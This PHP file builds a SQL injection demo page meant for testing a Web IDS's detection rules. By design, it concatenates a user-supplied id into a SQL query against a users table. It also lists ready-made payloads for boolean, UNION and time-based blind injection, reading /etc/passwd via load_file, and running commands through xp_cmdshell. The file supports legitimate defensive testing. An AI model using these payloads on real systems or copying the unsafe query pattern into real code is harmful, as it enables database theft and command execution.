<?php

declare(strict_types=1);

require_once __DIR__ . "/bootstrap.php";

$id = $_GET["id"] ?? "";
$query = "";

if ($id !== "") {
    $query = "SELECT id, username, password FROM users WHERE id = '" . $id . "'";
}

ob_start();
?>
<section class="panel">
  <h2>SQL 注入演示</h2>
  <p>该页面把 <code>id</code> 参数直接拼进 SQL 语句，可用于演示联合查询、布尔注入、时间盲注和高危数据库函数。</p>
  <form method="get">
    <label>
      用户 ID
      <input type="text" name="id" value="<?= demo_h($id) ?>" placeholder="1 或 1' UNION SELECT null,user(),database() --">
    </label>
    <div class="button-row">
      <button type="submit">构造查询</button>
      <a class="back-link" href="sqli.php">重置</a>
    </div>
  </form>
</section>

<section class="panel">
  <h2>快速测试</h2>
  <?= demo_examples([
      "布尔注入" => "sqli.php?id=1%27+OR+%271%27%3D%271",
      "联合查询" => "sqli.php?id=1+UNION+SELECT+null%2Cuser%28%29%2Cdatabase%28%29+--",
      "时间盲注" => "sqli.php?id=1%27%3Bwaitfor+delay+%270%3A0%3A5%27--",
      "数据库文件读取" => "sqli.php?id=1%27+UNION+SELECT+load_file%28%27%2Fetc%2Fpasswd%27%29%2Cnull%2Cnull--",
      "xp_cmdshell" => "sqli.php?id=1%27%3Bexec+master..xp_cmdshell+%27whoami%27--",
  ]) ?>
</section>

<?php if ($query !== ""): ?>
<section class="panel">
  <h2>拼接后的危险 SQL</h2>
  <pre><?= demo_h($query) ?></pre>
</section>
<?php endif; ?>
<?php
$content = ob_get_clean();
demo_render_page("SQL 注入演示", "用于测试 Web IDS 的 SQL 注入规则。", $content);
